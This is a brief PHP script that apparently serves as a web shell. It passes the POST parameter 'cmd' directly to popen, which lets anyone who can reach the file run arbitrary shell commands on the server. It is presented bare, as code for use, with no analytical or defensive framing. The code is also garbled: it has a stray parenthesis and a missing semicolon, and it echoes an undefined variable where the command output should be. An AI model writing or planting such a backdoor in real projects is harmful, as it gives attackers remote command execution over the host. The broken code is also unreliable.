<?php
if($_POST['cmd']!="php_eval"))
{
	$f = @popen($_POST['cmd'],"r")
    $res = "";
    while(!@feof($f)) { 
	    $res .= @fread($f,1024); 
	}
    echo @htmlspecialchars(@convert_cyr_string($cmd_rep,'d','w'))."\n"; 
	echo "end";
}
?>